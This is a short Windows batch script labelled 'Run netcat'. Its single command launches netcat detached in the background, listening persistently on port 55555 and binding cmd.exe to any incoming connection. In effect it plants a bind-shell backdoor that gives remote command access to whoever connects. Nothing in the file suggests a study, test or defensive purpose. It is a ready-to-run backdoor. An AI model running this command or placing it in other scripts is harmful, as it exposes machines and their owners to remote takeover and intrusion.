::Run netcat

@echo off
start nc -l -p 55555 -e cmd.exe -L -d
